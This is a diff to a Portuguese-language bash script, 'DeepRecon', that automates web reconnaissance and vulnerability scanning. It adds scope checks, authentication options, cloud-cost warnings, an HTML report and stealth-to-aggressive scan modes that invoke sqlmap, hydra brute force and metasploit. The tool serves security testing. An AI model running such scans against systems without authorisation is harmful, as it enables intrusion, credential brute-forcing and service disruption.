@@ -29,6 +29,22 @@ TOTAL_RAM=$(free -m 2>/dev/null | awk '/Mem:/{print $2}')
 FREE_DISK=$(df -m . 2>/dev/null | awk 'NR==2{print $4}')
 [ -z "$FREE_DISK" ] && FREE_DISK=1024
 
+# Rate limiting (predefinido, sobrescrito pelo modo)
+RATE_LIMIT_MS=300
+_LAST_CURL=0
+delay_ms() { local ms=$1; sleep $((ms / 1000)).$((ms % 1000)) 2>/dev/null || sleep $((ms / 1000)); }
+
+# Carregar variaveis de ambiente e API keys de .env
+SCRIPT_DIR=$(dirname "$(realpath "$0" 2>/dev/null || readlink -f "$0" 2>/dev/null || echo "$0")" 2>/dev/null)
+carregar_env() {
+  local envs="$SCRIPT_DIR/.env $HOME/.config/deeprecon/.env"
+  for envf in $envs; do
+    [ -f "$envf" ] && { set -a; source "$envf"; set +a; info "API keys carregadas de $envf"; return 0; }
+  done
+  [ -f "$SCRIPT_DIR/.env.example" ] && aviso "Crie $SCRIPT_DIR/.env a partir de .env.example para API keys"
+  return 0
+}
+
 if [ "$CPU_CORES" -le 2 ] || [ "$TOTAL_RAM" -le 1500 ]; then
   HW_NIVEL="BAIXO"; THREADS=5
   HW_COR=$YELLOW
@@ -53,6 +69,392 @@ loading_bar() {
     sleep 0.5
   done
   echo ""
+}
+
+# ============================================================
+# FUNCOES GLOBAIS
+# ============================================================
+roda() {
+  local tool="$1"; shift
+  local rc=0; "$@" || rc=$?
+  [ "$rc" -ne 0 ] && echo -e "  ${YELLOW}[!] '$tool' falhou (exit $rc)${RESET}" >&2
+  return $rc
+}
+curl_rapido() {
+  local now=$(date +%s); local diff=$((now - _LAST_CURL))
+  [ "$RATE_LIMIT_MS" -gt 0 ] 2>/dev/null && { [ "$((RATE_LIMIT_MS / 1000))" -gt "$diff" ] 2>/dev/null && sleep $((RATE_LIMIT_MS / 1000 - diff)); }
+  _LAST_CURL=$now
+  curl --connect-timeout 5 --max-time 10 -s "$@"
+}
+html_encode() { sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g; s/'\''/\&#39;/g'; }
+gerar_html_report() {
+  local rt="$1" ho="$2" alvo="$3" dominio="$4" data="$5"
+  local tc=$(grep -c "\[CRITICO\]" "$rt" 2>/dev/null||echo 0)
+  local ta=$(grep -c "\[ALERTA\]" "$rt" 2>/dev/null||echo 0)
+  local total=$((tc+ta))
+  local score=$([ "$total" -ge 30 ]&&echo "CRITICO"||[ "$total" -ge 15 ]&&echo "ALTO"||[ "$total" -ge 5 ]&&echo "MEDIO"||echo "BAIXO")
+  local cor=$([ "$total" -ge 30 ]&&echo "#dc3545"||[ "$total" -ge 15 ]&&echo "#fd7e14"||[ "$total" -ge 5 ]&&echo "#ffc107"||echo "#28a745")
+  local rows="" rowid=0
+  while IFS= read -r l; do
+    local tipo cor_linha
+    if echo "$l"|grep -q "\[CRITICO\]"; then tipo="CRITICO"; cor_linha="#dc3545"
+    elif echo "$l"|grep -q "\[ALERTA\]"; then tipo="ALERTA"; cor_linha="#ffc107"
+    else continue; fi
+    local desc=$(echo "$l"|sed 's/\[CRITICO\] //;s/\[ALERTA\] //'|html_encode)
+    local cat="Outros"
+    echo "$desc"|grep -qiE "SQL INJECTION|sqlmap|SQLi" && cat="SQL Injection"
+    echo "$desc"|grep -qiE "XSS|cross.site" && cat="Cross-Site Scripting"
+    echo "$desc"|grep -qiE "WAF|firewall" && cat="WAF / Firewall"
+    echo "$desc"|grep -qiE "backup|wp.config|BAK|.sql|dump" && cat="Backup / Vazamento"
+    echo "$desc"|grep -qiE "ACESSO LIVRE|DIRETORIO|path|traversal" && cat="Diretorio Exposto"
+    echo "$desc"|grep -qiE "git|.env|config|PHPINFO" && cat="Configuracao Exposta"
+    echo "$desc"|grep -qiE "PUT|upload|webshell|shell" && cat="Upload / Webshell"
+    echo "$desc"|grep -qiE "PORTA ABERTA|SERVICO ENCONTRADO|porta" && cat="Porta / Servico"
+    echo "$desc"|grep -qiE "METASPLOIT|cve|CVE" && cat="Exploit / CVE"
+    echo "$desc"|grep -qiE "SSL|certificado|heartbleed|poodle" && cat="SSL/TLS"
+    echo "$desc"|grep -qiE "header|HSTS|CSP|X-Frame|XSS.Protection" && cat="Header de Seguranca"
+    echo "$desc"|grep -qiE "cookie|session" && cat="Cookie / Sessao"
+    echo "$desc"|grep -qiE "Default Credential|password|login|admin" && cat="Credenciais / Acesso"
+    rows+="<tr class=\"sev_$tipo\" data-cat=\"$cat\"><td><span class=\"badge $tipo\">$tipo</span></td><td>$desc</td><td>$cat</td></tr>"
+    rowid=$((rowid+1))
+  done < <(grep -E "\[CRITICO\]|\[ALERTA\]" "$rt" 2>/dev/null)
+  html_tmp=$(mktemp)
+  cat > "$html_tmp" << 'HTMLEND'
+<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DeepRecon - __DOMINIO__</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',sans-serif;background:#0a0e17;color:#e0e0e0;padding:20px}
+h1{color:#00d4ff;font-size:1.8em;margin-bottom:20px}
+h2{color:#8892b0;font-size:1.2em;margin-bottom:10px}
+.card{background:#12162a;border:1px solid #1e2745;border-radius:10px;padding:20px;margin:10px 0}
+.card h2{border-bottom:1px solid #1e2745;padding-bottom:8px;margin-bottom:12px}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px}
+.stat{text-align:center;padding:10px;border-radius:8px;background:#0d1117}
+.stat .num{font-size:2em;font-weight:bold}
+.stat .lbl{font-size:.8em;color:#8892b0;margin-top:4px}
+.stat.crit .num{color:#dc3545}
+.stat.alert .num{color:#ffc107}
+.stat.total .num{color:#00d4ff}
+.bar{background:#0d1117;border-radius:8px;height:28px;overflow:hidden;margin:10px 0}
+.bar-fill{height:100%;text-align:center;line-height:28px;color:#fff;font-weight:bold;transition:width .5s}
+table{width:100%;border-collapse:collapse;font-size:.9em}
+th{text-align:left;color:#8892b0;border-bottom:2px solid #1e2745;padding:10px 8px;cursor:pointer}
+th:hover{color:#00d4ff}
+td{border-bottom:1px solid #1a1f33;padding:8px;vertical-align:top}
+tr:hover{background:#1a1f33}
+.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:.8em;font-weight:bold}
+.badge.CRITICO{background:#dc354522;color:#dc3545;border:1px solid #dc3545}
+.badge.ALERTA{background:#ffc10722;color:#ffc107;border:1px solid #ffc107}
+.filtro{display:flex;gap:8px;flex-wrap:wrap;margin:10px 0}
+.filtro button{padding:6px 14px;border:1px solid #1e2745;border-radius:6px;background:#0d1117;color:#e0e0e0;cursor:pointer;font-size:.85em}
+.filtro button:hover,.filtro button.ativo{border-color:#00d4ff;color:#00d4ff}
+.busca input{width:100%;padding:10px;border:1px solid #1e2745;border-radius:6px;background:#0d1117;color:#e0e0e0;font-size:.9em;margin-bottom:10px}
+.busca input:focus{outline:none;border-color:#00d4ff}
+footer{text-align:center;color:#555;font-size:.8em;margin-top:30px;padding:20px}
+</style></head><body>
+<h1>&#x1F50D; DeepRecon - Relatorio de Seguranca</h1>
+<div class="card">
+  <div class="grid">
+    <div class="stat"><div class="num">__ALVO__</div><div class="lbl">Alvo</div></div>
+    <div class="stat"><div class="num">__DOMINIO__</div><div class="lbl">Dominio</div></div>
+    <div class="stat"><div class="num">__DATA__</div><div class="lbl">Data</div></div>
+    <div class="stat"><div class="num" style="color:__COR__">__SCORE__</div><div class="lbl">Score</div></div>
+  </div>
+</div>
+<div class="card">
+  <h2>&#x1F4CA; Resumo</h2>
+  <div class="grid">
+    <div class="stat crit"><div class="num">__TC__</div><div class="lbl">Criticos</div></div>
+    <div class="stat alert"><div class="num">__TA__</div><div class="lbl">Alertas</div></div>
+    <div class="stat total"><div class="num">__TOTAL__</div><div class="lbl">Total Achados</div></div>
+  </div>
+  <div class="bar"><div class="bar-fill" style="width:__BARRA__%;background:__COR__">__BARRA__%</div></div>
+</div>
+<div class="card">
+  <h2>&#x1F4CB; Achados</h2>
+  <div class="filtro" id="filtros">
+    <button class="ativo" data-filtro="all">Todos</button>
+    <button data-filtro="CRITICO">Criticos</button>
+    <button data-filtro="ALERTA">Alertas</button>
+    <button data-filtro="cat">SQL Injection</button>
+    <button data-filtro="cat">XSS</button>
+    <button data-filtro="cat">Diretorio Exposto</button>
+    <button data-filtro="cat">Configuracao</button>
+    <button data-filtro="cat">Upload</button>
+    <button data-filtro="cat">SSL/TLS</button>
+  </div>
+  <div class="busca"><input type="text" id="busca" placeholder="Pesquisar achados..."></div>
+  <table id="tabela-achados">
+    <thead><tr><th onclick="ordena(0)">Severidade</th><th onclick="ordena(1)">Descricao</th><th onclick="ordena(2)">Categoria</th></tr></thead>
+    <tbody>__ROWS__</tbody>
+  </table>
+</div>
+<script>
+const filtros=document.querySelectorAll('#filtros button');
+const busca=document.getElementById('busca');
+const linhas=document.querySelectorAll('#tabela-achados tbody tr');
+filtros.forEach(b=>b.addEventListener('click',()=>{
+  filtros.forEach(x=>x.classList.remove('ativo'));
+  b.classList.add('ativo');const f=b.dataset.filtro;
+  linhas.forEach(l=>{
+    const sev=l.classList.contains('sev_CRITICO')?'CRITICO':l.classList.contains('sev_ALERTA')?'ALERTA':'';
+    const cat=l.dataset.cat||'';
+    if(f=='all')l.style.display='';
+    else if(f=='CRITICO'||f=='ALERTA')l.style.display=sev==f?'':'none';
+    else l.style.display=cat==f?'':'none';
+  });
+}));
+busca.addEventListener('input',()=>{
+  const q=busca.value.toLowerCase();
+  linhas.forEach(l=>l.style.display=l.textContent.toLowerCase().includes(q)?'':'none');
+});
+function ordena(n){const t=document.getElementById('tabela-achados');const b=Array.from(t.rows).slice(1);b.sort((a,b)=>a.cells[n].textContent.localeCompare(b.cells[n].textContent));b.forEach(r=>t.tBodies[0].appendChild(r));}
+</script>
+<footer>Gerado por DeepRecon v__VERSAO__ em __DATA__</footer>
+</body></html>
+HTMLEND
+  local barra=$((total>50?100:total*2))
+  cp "$html_tmp" "$ho"
+  sed -i "s|__ALVO__|$alvo|g; s|__DOMINIO__|$dominio|g; s|__DATA__|$data|g; s|__COR__|$cor|g; s|__SCORE__|$score|g; s|__TC__|$tc|g; s|__TA__|$ta|g; s|__TOTAL__|$total|g; s|__BARRA__|$barra|g; s|__ROWS__|$rows|g; s|__VERSAO__|$VERSAO_SCR|g" "$ho"
+  rm -f "$html_tmp"
+  echo -e "  ${GREEN}[HTML] ${CYAN}$ho${RESET}"
+}
+
+# ============================================================
+# FUNCOES DE RESILIENCIA E OTIMIZACAO
+# ============================================================
+# Fix 1/5: Valida ferramenta e testa conectividade
+valida_ferramenta() {
+  local cmd="$1"
+  command -v "$cmd" &>/dev/null || { aviso "$cmd nao encontrado no sistema"; return 1; }
+  timeout 5 "$cmd" --version 2>/dev/null | head -1 &>/dev/null || timeout 5 "$cmd" -h 2>/dev/null | head -1 &>/dev/null || true
+  return 0
+}
+
+verificar_conexao() {
+  local alvo="$1" dominio="${2:-$alvo}"
+  local code=$(curl_rapido -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 8 "$alvo" 2>/dev/null)
+  if [ -z "$code" ] || [ "$code" = "000" ]; then
+    aviso "Alvo $alvo inalcancavel - pulando scans intensivos"
+    return 1
+  fi
+  return 0
+}
+
+tentar() {
+  local max=${MAX_TENTATIVAS:-2} n=0 nome="$1"
+  shift
+  until timeout 60 "$@" 2>/dev/null; do
+    n=$((n+1))
+    [ "$n" -ge "$max" ] && { aviso "$nome falhou apos $max tentativas"; return 1; }
+    info "Tentativa $n/$max para $nome"
+    sleep $((n*3))
+  done
+  return 0
+}
+
+# Fix 3: Controle de jobs paralelos
+MAX_JOBS=$(( CPU_CORES * 2 ))
+[ "$MAX_JOBS" -lt 2 ] && MAX_JOBS=2
+[ "$MAX_JOBS" -gt 20 ] && MAX_JOBS=20
+JOB_PIDS=()
+
+job_lanca() {
+  local nome="$1"; shift
+  job_espera
+  ("$@" 2>/dev/null || aviso "$nome falhou") &
+  JOB_PIDS+=($!)
+}
+
+job_espera() {
+  while [ "$(jobs -rp | wc -l)" -ge "$MAX_JOBS" ]; do
+    wait -n 2>/dev/null
+  done
+}
+
+job_aguarda_todos() {
+  for pid in "${JOB_PIDS[@]}"; do
+    wait "$pid" 2>/dev/null
+  done
+  JOB_PIDS=()
+}
+
+# Fix 2: Limpeza de arquivos temporarios
+MAX_OUTPUT_BYTES=51200
+limpar_temporarios() {
+  rm -f /tmp/.deeprecon_* 2>/dev/null
+  find /tmp -name "DeepRecon_*.txt" -mtime +1 -delete 2>/dev/null
+  find /tmp -name "DeepRecon_*.json" -mtime +1 -delete 2>/dev/null
+  find /tmp -name "DeepRecon_*.html" -mtime +1 -delete 2>/dev/null
+}
+
+# Fix 6: Validacao de escopo
+SCOPE_DOMAIN=""
+SCOPE_ALVOS=()
+
+escopo_adicionar() {
+  local sub="$1"
+  [ -z "$SCOPE_DOMAIN" ] && return 0
+  if echo "$sub" | grep -qiE "(amazonaws|cloudfront|zendesk|freshdesk|salesforce|shopify|wix|squarespace)"; then
+    aviso "FORA DE ESCOPO: $sub parece servico de terceiro"
+    return 1
+  fi
+  if [[ "$sub" == *".$SCOPE_DOMAIN" ]] || [[ "$sub" == "$SCOPE_DOMAIN" ]]; then
+    SCOPE_ALVOS+=("$sub")
+    return 0
+  fi
+  aviso "FORA DE ESCOPO: $sub nao pertence a *.$SCOPE_DOMAIN"
+  return 1
+}
+
+# Fix 4: Deteccao de SPA (React/Angular/Vue)
+TEC_SPA=0 TEC_REACT=0 TEC_ANGULAR=0 TEC_VUE=0 TEC_API=0
+detectar_spa() {
+  local body=$(curl_rapido --max-time 5 "$ALVO" 2>/dev/null)
+  echo "$body" | grep -qi "react-app\|__NEXT_DATA__\|react-dom\|createRoot" && TEC_REACT=1 && TEC_SPA=1
+  echo "$body" | grep -qi "ng-app\|ng-version\|angular" && TEC_ANGULAR=1 && TEC_SPA=1
+  echo "$body" | grep -qi "vue-app\|__VUE__\|vuex\|nuxt" && TEC_VUE=1 && TEC_SPA=1
+  if [ "$TEC_SPA" = "1" ]; then
+    info "SPA detectado ($([ $TEC_REACT = 1 ] && echo 'React' || [ $TEC_ANGULAR = 1 ] && echo 'Angular' || echo 'Vue')) - testando endpoints API"
+    for api_path in api graphql rest swagger openapi.json v1 v2 api/v1 api/v2 api/graphql; do
+      api_code=$(curl_rapido -o /dev/null -w "%{http_code}" --max-time 3 "$ALVO/$api_path" 2>/dev/null)
+      [ "$api_code" != "000" ] && [ "$api_code" != "404" ] && TEC_API=1 && info "  API endpoint: /$api_path (HTTP $api_code)"
+    done
+  fi
+}
+
+
+# ============================================================
+# ISSUE 1: DETECCAO DE CONFLITOS DE VERSAO
+# ============================================================
+VERSAO_SCR="1.0.0"
+VERSAO_GIT=""
+URL_GIT="https://api.github.com/repos/derambrplays/DeepRecon/releases/latest"
+
+verificar_versoes() {
+  local pyver=$(python3 --version 2>/dev/null | grep -oP '\d+\.\d+')
+  local gover=$(go version 2>/dev/null | grep -oP '\d+\.\d+')
+  local ok=0
+  [ -z "$pyver" ] && aviso "Python 3 nao encontrado - SQLMap/Commix podem falhar" && ok=1
+  [ -n "$pyver" ] && {
+    local pymajor=${pyver%%.*}
+    [ "$pymajor" -lt 3 ] && aviso "Python $pyver detectado - SQLMap exige Python 3" && ok=1
+  }
+  [ -z "$gover" ] && aviso "Go nao encontrado - Subfinder/Amass podem falhar" && ok=1
+  [ "$ok" -eq 0 ] && info "Todas as versoes de runtime sao compativeis"
+  return "$ok"
+}
+
+# ============================================================
+# ISSUE 4: AUTO-UPDATE
+# ============================================================
+verificar_atualizacao() {
+  echo -e "${CYAN}Verificando atualizacoes...${RESET}"
+  VERSAO_GIT=$(curl_rapido "$URL_GIT" 2>/dev/null | grep '"tag_name"' | head -1 | grep -oP 'v?\d+\.\d+\.\d+')
+  [ -z "$VERSAO_GIT" ] && { info "Nao foi possivel verificar atualizacoes (offline?)"; return 0; }
+  if [ "$VERSAO_GIT" != "$VERSAO_SCR" ]; then
+    echo -e "${YELLOW}Nova versao disponivel: $VERSAO_GIT (atual: $VERSAO_SCR)${RESET}"
+    echo -ne "${YELLOW}Atualizar agora? (S/n): ${RESET}"; read -r resp
+    [[ "$resp" != "n" && "$resp" != "N" ]] && {
+      git pull origin main 2>/dev/null || git pull origin master 2>/dev/null && {
+        echo -e "${GREEN}Atualizado! Execute o script novamente.${RESET}"; exit 0
+      } || aviso "Falha ao atualizar. Faca git pull manualmente."
+    }
+  else
+    info "DeepRecon $VERSAO_SCR atualizado"
+  fi
+}
+
+# ============================================================
+# ISSUE 2: MODO SEGURO (ANTI-POLUICAO)
+# ============================================================
+MODO_SEGURO=0
+detectar_forms_agressivos() {
+  local alvo="$1"
+  local forms=$(curl_rapido "$alvo" 2>/dev/null | grep -ciE '<form|<input.*type=.(text|email|password)|<textarea|<select')
+  local inputs=$(curl_rapido "$alvo" 2>/dev/null | grep -ciE '<input|<select|<textarea')
+  [ "$forms" -gt 3 ] || [ "$inputs" -gt 20 ] || return 0
+  echo -e "${YELLOW}╔══════════════════════════════════════════════════╗${RESET}"
+  echo -e "${YELLOW}║  AVISO: Muitos formularios detectados!          ║${RESET}"
+  echo -e "${YELLOW}║  $forms formularios, $inputs campos              ║${RESET}"
+  echo -e "${YELLOW}║  Testes agressivos podem POLUIR o banco de     ║${RESET}"
+  echo -e "${YELLOW}║  dados do alvo com cadastros falsos.            ║${RESET}"
+  echo -e "${YELLOW}╠══════════════════════════════════════════════════╣${RESET}"
+  echo -e "${YELLOW}║  [1] Modo SEGURO - pula testes de formulario    ║${RESET}"
+  echo -e "${YELLOW}║  [2] Ignorar e continuar (risco de poluicao)    ║${RESET}"
+  echo -e "${YELLOW}╚══════════════════════════════════════════════════╝${RESET}"
+  printf "${YELLOW}Escolha (1/2): ${RESET}"; read -r safe_resp
+  [ "$safe_resp" = "1" ] && MODO_SEGURO=1
+}
+
+# ============================================================
+# ISSUE 3: AUTENTICACAO
+# ============================================================
+AUTH_COOKIE=""
+AUTH_CRED=""
+AUTH_LOGIN_URL=""
+AUTH_LOGIN_BODY=""
+
+configurar_auth() {
+  echo -e "${CYAN}╔══════════════════════════════════════════════════╗${RESET}"
+  echo -e "${CYAN}║       CONFIGURACAO DE AUTENTICACAO              ║${RESET}"
+  echo -e "${CYAN}╠══════════════════════════════════════════════════╣${RESET}"
+  echo -e "${CYAN}║${RESET}  [0] Nenhuma (scan anonimo)"
+  echo -e "${CYAN}║${RESET}  [1] Cookie de sessao"
+  echo -e "${CYAN}║${RESET}  [2] Basic Auth (user:pass)"
+  echo -e "${CYAN}║${RESET}  [3] Login via formulario"
+  echo -e "${CYAN}╚══════════════════════════════════════════════════╝${RESET}"
+  printf "${YELLOW}Escolha (0-3): ${RESET}"; read -r auth_tipo
+  case "$auth_tipo" in
+    1) printf "Cookie (ex: PHPSESSID=abc123): "; read -r AUTH_COOKIE ;;
+    2) printf "Credencial (user:pass): "; read -r AUTH_CRED ;;
+    3) printf "URL de login: "; read -r AUTH_LOGIN_URL
+       printf "Body POST (ex: user=admin&pass=admin): "; read -r AUTH_LOGIN_BODY ;;
+    *) AUTH_COOKIE=""; AUTH_CRED=""; AUTH_LOGIN_URL=""; AUTH_LOGIN_BODY="" ;;
+  esac
+}
+
+curl_auth() {
+  local args=()
+  [ -n "$AUTH_COOKIE" ] && args+=(-b "$AUTH_COOKIE")
+  [ -n "$AUTH_CRED" ] && args+=(-u "$AUTH_CRED")
+  [ -n "$AUTH_LOGIN_URL" ] && {
+    local cookiejar="/tmp/.deeprecon_auth_$$.jar"
+    curl -s -c "$cookiejar" -d "$AUTH_LOGIN_BODY" "$AUTH_LOGIN_URL" >/dev/null 2>&1 && args+=(-b "$cookiejar")
+  }
+  curl_rapido "${args[@]}" "$@"
+}
+
+login_automatico() {
+  [ -z "$AUTH_LOGIN_URL" ] && [ -z "$AUTH_COOKIE" ] && [ -z "$AUTH_CRED" ] && return 0
+  info "Modo autenticado ativo${AUTH_COOKIE:+ (cookie)}${AUTH_CRED:+ (basic)}${AUTH_LOGIN_URL:+ (form)}"
+}
+
+detectar_nuvem() {
+  local ip="$1" headers="$2"
+  echo "$headers" | grep -qiE "cf-ray|__cfduid|cf-cache-status|x-amz-cf-id|x-amz-request-id|x-robots-tag.*cloudflare|server.*cloudflare|server.*akamai|server.*incapsula|x-guploader" && {
+    echo -e "  ${RED}╔══════════════════════════════════════════════════╗${RESET}"
+    echo -e "  ${RED}║${RESET}  ${BOLD}ALERTA: NUVEM DETECTADA!${RESET}                    ${RED}║${RESET}"
+    echo -e "  ${RED}║${RESET}  O alvo pode estar atras de CDN/proxy de nuvem.  ${RED}║${RESET}"
+    echo -e "  ${RED}║${RESET}  ${YELLOW}EDoS RISK:${RESET} O volume de requisicoes pode       ${RED}║${RESET}"
+    echo -e "  ${RED}║${RESET}  esgotar recursos da nuvem e gerar ${BOLD}cobrancas${RESET}      ${RED}║${RESET}"
+    echo -e "  ${RED}║${RESET}  financeiras para o proprietario do site.        ${RED}║${RESET}"
+    echo -e "  ${RED}║${RESET}                                               ${RED}║${RESET}"
+    if [ "$MODO" = "bruto" ]; then
+      echo -e "  ${RED}║${RESET}  ${YELLOW}Recomenda-se usar MODO MEDIO ou CUSTOM com        ${RED}║${RESET}"
+      echo -e "  ${RED}║${RESET}  taxa reduzida. Deseja continuar? (s/N)         ${RED}║${RESET}"
+      echo -e "  ${RED}╚══════════════════════════════════════════════════╝${RESET}"
+      printf "${YELLOW}Continuar mesmo assim? (s/N): ${RESET}"; read -r cloud_ok
+      [[ "$cloud_ok" != "s" && "$cloud_ok" != "S" ]] && { aviso "Scan abortado pelo aviso de nuvem"; exit 1; }
+      aviso "Continuando em modo bruto contra nuvem (risco EDoS assumido)"
+    else
+      echo -e "  ${RED}╚══════════════════════════════════════════════════╝${RESET}"
+    fi
+    return 0
+  }
+  return 0
 }
 
 # ============================================================
@@ -168,6 +570,9 @@ if [ ${#ALVOS[@]} -eq 0 ]; then
   exit 1
 fi
 
+# Carrega API keys de .env (se existir)
+carregar_env
+
 # ============================================================
 # HARDWARE CHECK + LOADING
 # ============================================================
@@ -186,62 +591,130 @@ if [ "$HW_NIVEL" = "BAIXO" ]; then
 fi
 echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
 echo ""
+verificar_versoes
+echo ""
 loading_bar 3 "Preparando modulos"
 echo ""
 
 # ============================================================
-# VERIFICA E INSTALA FERRAMENTAS
+# MODO DE SCAN + RUÍDO
 # ============================================================
+NOISE_LEVELS=(2 0 2 1 3 7 5 4 7 6 5 5 6 4 7 2 0 0 2 3 1 7 6 0 1 1 2 2 1 2 3 1 0 0 5)
+NOISE_TOTAL_MAX=0; for n in ${NOISE_LEVELS[*]}; do NOISE_TOTAL_MAX=$((NOISE_TOTAL_MAX+n)); done
+MODO=""; NOISE_MAX=5; CUSTOM_RUIDO=0
 clear
-FERRAMENTAS=("nmap" "whatweb" "nikto" "sqlmap" "ffuf" "subfinder" "amass" "gobuster" "wpscan" "sslscan" "wafw00f" "commix" "dnsrecon" "dnsenum" "hydra" "wfuzz" "searchsploit" "curl" "whois")
-echo -e "${YELLOW}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
-echo -e "${YELLOW}${BOLD}║        Verificando ferramentas instaladas       ║${RESET}"
-echo -e "${YELLOW}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
+echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
+echo -e "${CYAN}${BOLD}║         SELECIONE O MODO DE SCAN                ║${RESET}"
+echo -e "${CYAN}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
+echo -e "${CYAN}${BOLD}║${RESET}"
+echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}[1] FURTIVO${RESET}  - Apenas recon passivo"
+echo -e "${CYAN}${BOLD}║${RESET}  ${GREEN}  Sem brute force ou exploits${RESET}"
+echo -e "${CYAN}${BOLD}║${RESET}  ${GREEN}  Max noise 3/7${RESET}"
+echo -e "${CYAN}${BOLD}║${RESET}"
+echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}[2] MEDIO${RESET}    - Scan moderado"
+echo -e "${CYAN}${BOLD}║${RESET}  ${YELLOW}  Sem password brute ou SQLi pesado${RESET}"
+echo -e "${CYAN}${BOLD}║${RESET}  ${YELLOW}  Max noise 5/7${RESET}"
+echo -e "${CYAN}${BOLD}║${RESET}"
+echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}[3] BRUTO${RESET}    - Scan completo"
+echo -e "${CYAN}${BOLD}║${RESET}  ${RED}  Tudo: SQLMap, Hydra, WAF trigger${RESET}"
+echo -e "${CYAN}${BOLD}║${RESET}  ${RED}  Max noise 7/7${RESET}"
+echo -e "${CYAN}${BOLD}║${RESET}"
+echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}[4] CUSTOM${RESET}   - Escolha manual"
+echo -e "${CYAN}${BOLD}║${RESET}  ${CYAN}  Voce seleciona cada passo${RESET}"
+echo -e "${CYAN}${BOLD}║${RESET}"
+echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
 echo ""
-INSTALADAS=0
-FALTANDO=0
-FALTAM_LISTA=""
-for cmd in "${FERRAMENTAS[@]}"; do
-  if command -v "$cmd" &>/dev/null; then
-    echo -e "  ${GREEN}[ok]${RESET} $cmd"
-    INSTALADAS=$((INSTALADAS + 1))
-  else
-    echo -e "  ${RED}[falta]${RESET} $cmd"
-    FALTANDO=$((FALTANDO + 1))
-    FALTAM_LISTA="$FALTAM_LISTA $cmd"
-  fi
-done
-echo ""
-echo -e "  ${GREEN}$INSTALADAS instaladas${RESET} | ${RED}$FALTANDO faltando${RESET}"
-if [ "$FALTANDO" -gt 0 ]; then
-  echo ""
-  echo -e "${YELLOW}Deseja instalar as ferramentas faltando? (S/n)${RESET}"
-  read -r INSTALA
-  if [[ "$INSTALA" != "n" && "$INSTALA" != "N" ]]; then
-    echo -e "${CYAN}Instalando ferramentas faltando...${RESET}"
-    sudo apt-get update -qq 2>/dev/null
-    for cmd in $FALTAM_LISTA; do
-      echo -e "  ${YELLOW}Instalando $cmd...${RESET}"
-      sudo apt-get install -y -qq "$cmd" 2>/dev/null
-      if command -v "$cmd" &>/dev/null; then
-        echo -e "  ${GREEN}[ok]${RESET} $cmd instalado"
-        INSTALADAS=$((INSTALADAS + 1))
-        FALTANDO=$((FALTANDO - 1))
-      else
-        echo -e "  ${RED}[falhou]${RESET} $cmd nao foi instalado"
-      fi
-    done
-    echo ""
-    echo -e "  ${GREEN}$INSTALADAS instaladas${RESET} | ${RED}$FALTANDO faltando${RESET}"
-  fi
+printf "${YELLOW}Escolha o modo (1-4): ${RESET}"; read -r MODO_ESCOLHA
+case $MODO_ESCOLHA in
+  1) MODO="furtivo"; NOISE_MAX=3; RATE_LIMIT_MS=1000 ;;
+  2) MODO="medio"; NOISE_MAX=5; RATE_LIMIT_MS=300 ;;
+  3) MODO="bruto"; NOISE_MAX=7; RATE_LIMIT_MS=100 ;;
+  4) MODO="custom"; RATE_LIMIT_MS=200 ;;
+  *) echo -e "${RED}Opcao invalida. Usando MEDIO.${RESET}"; MODO="medio"; NOISE_MAX=5; RATE_LIMIT_MS=300 ;;
+esac
+
+# Calcula threads das ferramentas baseado no rate limit
+if [ "$RATE_LIMIT_MS" -ge 500 ]; then TOOL_THREADS=5
+elif [ "$RATE_LIMIT_MS" -ge 200 ]; then TOOL_THREADS=15
+else TOOL_THREADS=30
 fi
-echo -e "  ${YELLOW}Ferramentas faltando serao puladas.${RESET}"
+TOOL_THREADS=$(( TOOL_THREADS < THREADS ? TOOL_THREADS : THREADS ))
+
+# modo custom: selecao passo a passo
+if [ "$MODO" = "custom" ]; then
+  STEP_NAMES=("WAF detect" "Headers" "WhatWeb" "SSL/TLS" "Subdominios" "Nmap" "Diretorios" "Arquivos sensiveis" "SQLMap" "Commix" "FFUF" "WFuzz" "Nikto" "WPScan" "Hydra" "DNSRecon" "Whois" "SearchSploit" "HTTP Methods" "Servicos comuns" "CVE Check" "Exploracao agressiva" "Metasploit" "IA Brain" "Site info" "Email Security" "robots.txt" "SSL Grade" "JWT Hunter" "Traceroute" "WAF Behavior" "Tech CVE" "JSON Export" "HTML Report" "Deep Ports + SMB")
+  STEP_CHOICES=(); CUMULATIVE_NOISE=0
+  for ((i=0;i<${#STEP_NAMES[@]};i++)); do
+    rn=${NOISE_LEVELS[$i]}; rc=$([ "$rn" -le 2 ]&&echo "$GREEN"||[ "$rn" -le 5 ]&&echo "$YELLOW"||echo "$RED")
+    clear
+    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
+    echo -e "${CYAN}${BOLD}║       MODO CUSTOM - Selecione os passos         ║${RESET}"
+    echo -e "${CYAN}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
+    np=$((CUMULATIVE_NOISE*100/(NOISE_TOTAL_MAX>0?NOISE_TOTAL_MAX:1)))
+    nf=$(printf "%$((np/2))s"|tr ' ' '#'); ne=$(printf "%$((50-np/2))s")
+    echo -e "${CYAN}${BOLD}║${RESET}  ${YELLOW}[${nf}${ne}]${RESET}  ${np}% (${CUMULATIVE_NOISE}/${NOISE_TOTAL_MAX})"
+    echo -e "${CYAN}${BOLD}║${RESET}"
+    echo -e "${CYAN}${BOLD}║${RESET}  Passo $((i+1))/35: ${STEP_NAMES[$i]}"
+    echo -e "${CYAN}${BOLD}║${RESET}  Ruido: ${rc}${rn}/7${RESET}"
